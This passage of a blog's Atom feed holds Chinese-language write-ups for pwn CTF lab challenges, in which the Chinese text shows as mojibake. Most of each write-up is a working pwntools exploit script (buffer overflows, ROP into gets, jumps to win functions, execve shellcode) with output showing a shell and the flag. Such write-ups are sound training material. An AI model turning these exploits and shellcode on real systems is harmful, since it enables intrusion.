    <link href="https://kazma.tw/2024/01/09/Pwnctf-secret-Writeup/"/>
    <id>https://kazma.tw/2024/01/09/Pwnctf-secret-Writeup/</id>
    <published>2024-01-09T11:49:31.000Z</published>
    <updated>2024-01-09T12:10:25.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹æœ‰å“ªäº›è®Šæ•¸ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/secret_var.png"                      alt="var"                ><br>é—œéµåœ¨ä»–æœƒæ¯”è¼ƒ var_4h æ˜¯ä¸æ˜¯ 0xab37ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/secret_0x4.png"                      alt="0x4"                ><br>æˆ‘å€‘è¦å¾ var_20h overflow åˆ° var_4hï¼Œç„¶å¾Œé€ä¸€å€‹å¤§å¯« Yï¼Œå°±å¯ä»¥æ‹¿åˆ° flag äº†ã€‚</p><p>exploit.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./secret&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p64(<span class="number">0xab37</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;)&#x27;</span>, <span class="string">&quot;Y&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;secret&quot;&gt;&lt;a href=&quot;#secret&quot; class=&quot;headerlink&quot; title=&quot;secret&quot;&gt;&lt;/a&gt;secret&lt;/h1&gt;&lt;p&gt;æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹æœ‰å“ªäº›è®Šæ•¸ï¼š&lt;br&gt;&lt;img  
                     lazyload
</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf ret2src Writeup</title>
    <link href="https://kazma.tw/2024/01/09/Pwnctf-ret2src-Writeup/"/>
    <id>https://kazma.tw/2024/01/09/Pwnctf-ret2src-Writeup/</id>
    <published>2024-01-09T10:30:32.000Z</published>
    <updated>2024-01-09T11:23:32.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2src"><a href="#ret2src" class="headerlink" title="ret2src"></a>ret2src</h1><p>å…ˆçœ‹ä¸€ä¸‹ä¿è­·æ©Ÿåˆ¶ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/src_checksec.png"                      alt="checksec"                ></p><p>é€™é¡Œä»€éº¼ä¿è­·æ©Ÿåˆ¶éƒ½æ²’æœ‰wï¼Œæ‰€ä»¥ä½œæ³•æ‡‰è©²è »å¤šç¨®çš„ï¼Œé€™è£¡ return åˆ° gets çš„ pltï¼ŒæŠŠ shellcode å¯«åˆ°æŸå€‹ bss æ®µï¼Œç„¶å¾Œå†è·³ä¸Šé–‹ shellã€‚</p><p>exploit.py:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2src&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400713</span></span><br><span class="line">bss = <span class="number">0x602000</span> - <span class="number">0x100</span></span><br><span class="line">gets = <span class="number">0x00400510</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    gets,</span><br><span class="line">    bss</span><br><span class="line">)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p)</span><br><span class="line">r.sendline(<span class="string">b&#x27;\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>shellcode ï¼š<br><a class="link"   href="https://www.exploit-db.com/shellcodes/49770" >https://www.exploit-db.com/shellcodes/49770 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2src&quot;&gt;&lt;a href=&quot;#ret2src&quot; class=&quot;headerlink&quot; title=&quot;ret2src&quot;&gt;&lt;/a&gt;ret2src&lt;/h1&gt;&lt;p&gt;å…ˆçœ‹ä¸€ä¸‹ä¿è­·æ©Ÿåˆ¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img  
                     lazyl</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf registration Writeup</title>
    <link href="https://kazma.tw/2023/12/21/Pwnctf-registration-Writeup/"/>
    <id>https://kazma.tw/2023/12/21/Pwnctf-registration-Writeup/</id>
    <published>2023-12-21T13:32:41.000Z</published>
    <updated>2023-12-21T13:56:01.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="registration"><a href="#registration" class="headerlink" title="registration"></a>registration</h1><p>é€™é¡Œçš„é—œéµæ˜¯ä»–æœƒéš¨æ©Ÿç”Ÿä¸€å€‹ idï¼Œç„¶å¾Œå­˜åˆ°ä¸€å€‹å…¨åŸŸè®Šæ•¸ï¼Œæœ€å¾Œæœƒå»æª¢æŸ¥é€™å€‹å€¼æ˜¯å¦è¢«æ›´å‹•ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/reg_id.png"                      alt="id"                ></p><p>åªè¦å¼„æ¸…æ¥šè®Šæ•¸å…·é«”çš„ä½ç½®ï¼Œé€™é¡Œå°±è¼•é¬†é€šé—œäº†ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/reg_frame.png"                      alt="reg"                ></p><p>exploit.pyï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./registration&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x4007d6</span></span><br><span class="line">ret = <span class="number">0x400619</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">int</span>(r.recvline().decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">success(<span class="string">f&quot;id: <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="string">&#x27;kazma&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3c</span>, <span class="built_in">id</span>)</span><br><span class="line">p = p.ljust(<span class="number">72</span>) + flat(ret, win)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>resultï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./registration&#x27;</span>: pid 306835</span><br><span class="line">[+] <span class="built_in">id</span>: 81</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">MyFirstCTF&#123;B3_c4r3FuL_0f_l0cAl_V4rI4b13_0N_sT4ck_OwO&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;registration&quot;&gt;&lt;a href=&quot;#registration&quot; class=&quot;headerlink&quot; title=&quot;registration&quot;&gt;&lt;/a&gt;registration&lt;/h1&gt;&lt;p&gt;é€™é¡Œçš„é—œéµæ˜¯ä»–æœƒéš¨æ©Ÿç”Ÿä¸€å€‹ idï¼Œç„¶å¾Œå­˜åˆ°ä¸€å€‹å…¨åŸŸè®Šæ•¸ï¼Œæœ€å¾Œ</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf return Writeup</title>
    <link href="https://kazma.tw/2023/12/21/Pwnctf-return-Writeup/"/>
    <id>https://kazma.tw/2023/12/21/Pwnctf-return-Writeup/</id>
    <published>2023-12-21T08:42:58.000Z</published>
    <updated>2023-12-21T08:47:36.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="return"><a href="#return" class="headerlink" title="return"></a>return</h1><p>ç¶“å…¸ bofï¼Œè·³ä¸Šå»é€™å€‹é‚ªæƒ¡çš„æ±æ±å°±æå®šäº†ï¼Œè¨˜å¾—å°é½Š 0x10ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/return_evil.png"                      alt="return"                ></p><p>exploit.pyï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./return&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400539</span></span><br><span class="line">win = <span class="number">0x4006b6</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:)&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(ret) + p64(win))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>resultï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./return&#x27;</span>: pid 305499</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">BreakAllCTF&#123;G00d_j0000000000b:)&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;return&quot;&gt;&lt;a href=&quot;#return&quot; class=&quot;headerlink&quot; title=&quot;return&quot;&gt;&lt;/a&gt;return&lt;/h1&gt;&lt;p&gt;ç¶“å…¸ bofï¼Œè·³ä¸Šå»é€™å€‹é‚ªæƒ¡çš„æ±æ±å°±æå®šäº†ï¼Œè¨˜å¾—å°é½Š 0x10ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img  
       </summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf binary Writeup</title>
    <link href="https://kazma.tw/2023/12/21/Pwnctf-binary-Writeup/"/>
    <id>https://kazma.tw/2023/12/21/Pwnctf-binary-Writeup/</id>
    <published>2023-12-21T06:43:42.000Z</published>
    <updated>2023-12-21T07:04:48.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h1><p>é€™é¡Œæœ‰ä¸‰å€‹éšæ®µï¼Œåˆ†åˆ¥è¼¸å…¥ç‰¹å®šçš„å€¼å°±å¯ä»¥é–‹ shellï¼Œé¦–å…ˆ stage1ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/binary_s1.png"                      alt="s1"                ></p><p>æ³¨æ„å‰é¢å…©å€‹æ˜¯ jeï¼Œæœ€å¾Œä¸€å€‹æ˜¯ jneï¼Œæ‰€ä»¥é€™é‚Šè¦é€ 0x100001ï¼Œå†ä¾† stage2ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/binary_s2.png"                      alt="s2"                ></p><p>é€™æ¬¡è¦é€ä¸‰å€‹å€¼åˆ†åˆ¥æ˜¯ï¼š0x64ï¼Œ0x100ï¼Œ0xfaceb00cï¼Œæ¥è‘—å°±åˆ° stage3ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/binary_s3.png"                      alt="s3"                ></p><p>é€™æ¬¡ä»–è¦å•çš„æ˜¯ <code>im_a_global_variable</code> çš„ä½å€ï¼Œé‚£å°±æ˜¯ 0x60107cï¼Œä»¥ä¸Šè³‡è¨Šæ•´ç†æˆ exploit.pyï¼Œé †ä¾¿æŠŠ BytesWarning é—œæ‰ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line">r = process(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x100001</span>))</span><br><span class="line">r.sendline(<span class="string">&quot;&#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">0x64</span>, <span class="number">0x100</span>, <span class="number">0xfaceb00c</span>))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x60107c</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>resultï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./binary&#x27;</span>: pid 304980</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Stage 1</span><br><span class="line">Stage 1 completed</span><br><span class="line">Stage 2</span><br><span class="line">Stage 2 completed</span><br><span class="line">Stage 3</span><br><span class="line">Stage 3 completed</span><br><span class="line">Congrat! Here is your shell!</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">BreakAllCTF&#123;A_g00d_h4cker_15_f4m1liar_w1th_b1n4ry_5ystem&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;binary&quot;&gt;&lt;a href=&quot;#binary&quot; class=&quot;headerlink&quot; title=&quot;binary&quot;&gt;&lt;/a&gt;binary&lt;/h1&gt;&lt;p&gt;é€™é¡Œæœ‰ä¸‰å€‹éšæ®µï¼Œåˆ†åˆ¥è¼¸å…¥ç‰¹å®šçš„å€¼å°±å¯ä»¥é–‹ shellï¼Œé¦–å…ˆ stage1ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img  
  </summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf pwntools Writeup</title>
    <link href="https://kazma.tw/2023/12/20/Pwnctf-pwntools-Writeup/"/>
    <id>https://kazma.tw/2023/12/20/Pwnctf-pwntools-Writeup/</id>
    <published>2023-12-20T15:31:10.000Z</published>
    <updated>2023-12-20T15:37:48.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><p>é¦–å…ˆä»–æœƒæ¯”è¼ƒç¬¬ä¸€å€‹åƒæ•¸æ˜¯å¦ç‚ºä¸€å€‹ç‰¹å®šçš„å€¼ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwntools_compare.png"                      alt="pwntools"                ></p><p>å†ä¾†å°±æ˜¯ç”¨ pwntools ä¾†è§£æ±ºä»–çš„ä¸€åƒé“æ•¸å­¸é¡Œï¼Œexploit.pyï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwntools&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:)&#x27;</span>, p32(<span class="number">0x79487ff</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    q = r.recvuntil(<span class="string">b&#x27;?&#x27;</span>).decode().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">    a = <span class="built_in">str</span>(<span class="built_in">eval</span>(q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;count&#125;</span>: <span class="subst">&#123;q&#125;</span> = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">    r.sendline(a)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>resultï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">988: 9203 * 20282 = 186655246</span><br><span class="line">989: 19822 + 22058 = 41880</span><br><span class="line">990: 38646 - 12687 = 25959</span><br><span class="line">991: 20506 * 5162 = 105851972</span><br><span class="line">992: 39428 - 8646 = 30782</span><br><span class="line">993: 1659 - 19180 = -17521</span><br><span class="line">994: 37476 * 13886 = 520391736</span><br><span class="line">995: 7168 * 38433 = 275487744</span><br><span class="line">996: 17943 + 38791 = 56734</span><br><span class="line">997: 39312 + 13976 = 53288</span><br><span class="line">998: 4194 * 19531 = 81913014</span><br><span class="line">999: 4477 - 39353 = -34876</span><br><span class="line">1000: 779 + 34351 = 35130</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Welcome hacker!</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">BreakAllCTF&#123;Scr1pting_skill_is_important_for_a_hacker&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwntools&quot;&gt;&lt;a href=&quot;#pwntools&quot; class=&quot;headerlink&quot; title=&quot;pwntools&quot;&gt;&lt;/a&gt;pwntools&lt;/h1&gt;&lt;p&gt;é¦–å…ˆä»–æœƒæ¯”è¼ƒç¬¬ä¸€å€‹åƒæ•¸æ˜¯å¦ç‚ºä¸€å€‹ç‰¹å®šçš„å€¼ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img  
          </summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf ret2sc Writeup</title>
    <link href="https://kazma.tw/2023/12/20/Pwnctf-ret2sc-Writeup/"/>
    <id>https://kazma.tw/2023/12/20/Pwnctf-ret2sc-Writeup/</id>
    <published>2023-12-20T14:57:23.000Z</published>
    <updated>2023-12-20T15:03:09.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2sc"><a href="#ret2sc" class="headerlink" title="ret2sc"></a>ret2sc</h1><p>é€™é¡Œå°±æ˜¯å…ˆæŠŠ shellcode å¯«åˆ° name ä¸Šï¼Œå†è·³ä¸Šå»å°±è¡Œï¼Œä¸éæ¯”è¼ƒæ–°çš„ä½œæ¥­ç³»çµ± bss æ®µæ²’æœ‰ x æ¬Šé™ï¼Œé€™é‚Šå°±ç›´æ¥ä¸Š exploit.pyï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2sc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x601080</span></span><br><span class="line">sc = <span class="string">b&quot;\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(name))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>shellcode æ˜¯å¾é€™é‚Šæ‰¾çš„ï¼š<br><a class="link"   href="https://www.exploit-db.com/shellcodes/49770" >https://www.exploit-db.com/shellcodes/49770 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2sc&quot;&gt;&lt;a href=&quot;#ret2sc&quot; class=&quot;headerlink&quot; title=&quot;ret2sc&quot;&gt;&lt;/a&gt;ret2sc&lt;/h1&gt;&lt;p&gt;é€™é¡Œå°±æ˜¯å…ˆæŠŠ shellcode å¯«åˆ° name ä¸Šï¼Œå†è·³ä¸Šå»å°±è¡Œï¼Œä¸éæ¯”è¼ƒæ–°çš„ä½œæ¥­ç³»çµ± bss æ®µæ²’æœ‰ x</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
</feed>
